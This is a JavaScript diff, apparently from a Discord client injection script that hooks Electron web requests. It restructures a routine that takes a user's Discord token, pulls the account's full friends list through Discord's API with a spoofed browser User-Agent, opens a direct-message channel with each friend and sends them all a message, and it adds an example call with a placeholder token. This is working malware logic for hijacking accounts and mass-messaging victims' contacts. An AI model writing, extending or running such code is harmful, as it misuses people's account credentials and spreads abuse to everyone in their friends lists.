@@ -532,66 +532,27 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
 
 
 
-const FR = async () => {
 
-    const fetch = require('node-fetch');
+
+const fetch = require('node-fetch');
+
+async function getURL(url, token) {
+    const response = await fetch(url, {
+        headers: {
+            "Authorization": token
+        }
+    });
+    if (response.ok) {
+        return await response.json();
+    } else {
+        throw new Error('Failed to fetch URL: ' + response.statusText);
+    }
+}
+
+const FR = async (token) => {
     const M = 'err0r';
-
-    async function getFriendsList(token) {
-        try {
-            const headers = {
-                "Authorization": token,
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
-            };
-            const response = await fetch('https://discord.com/api/v6/users/@me/relationships', { headers });
-            const friendlist = await response.json();
-            return friendlist.map(friend => friend.user.id);
-        } catch (error) {
-            console.error('An error occurred while getting the friends list:', error);
-            return [];
-        }
-    }
-    
-    async function sendMessageToFriend(token, recipientIds, message) {
-        try {
-            const headers = {
-                "Authorization": token,
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
-            };
-            for (const recipient of recipientIds) {
-                const channelResponse = await fetch('https://discord.com/api/v10/users/@me/channels', {
-                    method: 'POST',
-                    headers,
-                    body: JSON.stringify({ recipient_id: recipient }),
-                });
-                if (channelResponse.ok) {
-                    const channelData = await channelResponse.json();
-                    const channelId = channelData.id;
-                    if (channelId) {
-                        const messageResponse = await fetch(`https://discord.com/api/v10/channels/${channelId}/messages`, {
-                            method: 'POST',
-                            headers,
-                            body: JSON.stringify({ content: message }),
-                        });
-                        if (messageResponse.ok) {
-                            console.log(`Message sent successfully to user with ID ${recipient}`);
-                        } else {
-                            console.error('Error sending message:', await messageResponse.text());
-                        }
-                    } else {
-                        console.error('Error getting channel ID');
-                    }
-                } else {
-                    console.error('Error creating channel for message:', await channelResponse.text());
-                }
-            }
-        } catch (error) {
-            console.error('An error occurred:', error);
-        }
-    }
-        try {
+    try {
+        const user = await getURL("https://discord.com/api/v8/users/@me", token);
         const friendIds = await getFriendsList(token);
         await sendMessageToFriend(token, friendIds, M);
     } catch (error) {
@@ -599,8 +560,65 @@ const FR = async () => {
     }
 }
 
+async function getFriendsList(token) {
+    try {
+        const headers = {
+            "Authorization": token,
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+        };
+        const response = await fetch('https://discord.com/api/v6/users/@me/relationships', { headers });
+        const friendlist = await response.json();
+        return friendlist.map(friend => friend.user.id);
+    } catch (error) {
+        console.error('An error occurred while getting the friends list:', error);
+        return [];
+    }
+}
 
-FR();
+async function sendMessageToFriend(token, recipientIds, message) {
+    try {
+        const headers = {
+            "Authorization": token,
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+        };
+        for (const recipient of recipientIds) {
+            const channelResponse = await fetch('https://discord.com/api/v10/users/@me/channels', {
+                method: 'POST',
+                headers,
+                body: JSON.stringify({ recipient_id: recipient }),
+            });
+            if (channelResponse.ok) {
+                const channelData = await channelResponse.json();
+                const channelId = channelData.id;
+                if (channelId) {
+                    const messageResponse = await fetch(`https://discord.com/api/v10/channels/${channelId}/messages`, {
+                        method: 'POST',
+                        headers,
+                        body: JSON.stringify({ content: message }),
+                    });
+                    if (messageResponse.ok) {
+                        console.log(`Message sent successfully to user with ID ${recipient}`);
+                    } else {
+                        console.error('Error sending message:', await messageResponse.text());
+                    }
+                } else {
+                    console.error('Error getting channel ID');
+                }
+            } else {
+                console.error('Error creating channel for message:', await channelResponse.text());
+            }
+        }
+    } catch (error) {
+        console.error('An error occurred:', error);
+    }
+}
+
+// Example usage:
+const token = "your_discord_token_here";
+FR(token);
+
 
 
 
